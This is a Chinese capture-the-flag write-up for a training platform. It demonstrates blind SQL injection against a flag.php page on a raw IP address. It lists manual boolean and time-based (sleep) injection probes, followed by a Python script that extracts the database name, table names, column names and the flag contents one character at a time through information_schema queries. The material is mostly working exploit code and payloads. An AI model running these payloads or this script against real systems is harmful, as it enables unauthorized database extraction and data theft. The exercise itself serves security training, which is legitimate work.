日常检测注入类型
http://219.153.49.228:40947/flag.php?type=1  // 帮墨者找到

http://219.153.49.228:40947/flag.php?type=1'  // 墨者的任性网页!

http://219.153.49.228:40947/flag.php?type=1' and 1 = 2 // 帮墨者找到   //猜测是类似于错误的页面

http://219.153.49.228:40947/flag.php?type=1 and 1 = 1 --+ // 墨者的任性网页!

http://219.153.49.228:40947/flag.php?type=1 and ascii(substr(database(),1,1)) > 500 --+ // 墨者的任性网页!  没有数据 名称是0  有数据 名称是id值

可以用基于时间的盲注，但没必要
> http://219.153.49.228:41969/flag.php?type=1 and if(ascii(substr(database(),0,1)) = 32,sleep(500),1) --+

直接根据名称显示是否是0来进行盲注
```
Python 代码
import requests
import re
import os
import urllib.parse

all = 32
#发送payload
def sendPayload(payload):
    print(payload)
    r = requests.get(payload)
    return r.text

#拼装payload-时间盲注
def buildPayload(payload):
    #http://219.153.49.228:41160/flag.php?type=1 and ascii(substr(database(),{index1},1)) > {index2}
    resultChr = ''
    for index1 in range(1,100):
        payload1 = payload.replace('{index1}',str(index1))
        for index2 in range(32,127):
            result = sendPayload(payload1.replace('{index2}',str(index2)))
            if not rex(result,'0'):
                resultChr+=chr(index2)
                break
            elif index2 == 126:
                return resultChr
    return resultChr
                
            
def rex(text,restr):
    result = re.findall(restr,text)
    if len(result) == 1:
        return 1
    else:
        return 0


url1='http://219.153.49.228:40947/flag.php?type=1 and ascii(substr(database(),{index1},1)) = {index2} --+' #pentesterlab
url2='http://219.153.49.228:40947/flag.php?type=1 and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema = database()),{index1},1)) = {index2} --+' # comment,flag,goods,user
url3='http://219.153.49.228:40947/flag.php?type=1 and ascii(substr((select group_concat(column_name) from information_schema.columns where table_name = "flag"),{index1},1)) = {index2} --+' # id,flag
url4='http://219.153.49.228:40947/flag.php?type=1 and ascii(substr((select group_concat(flag) from flag),{index1},1)) = {index2} --+' # id,flag

result = buildPayload(url4)
print(result)

```

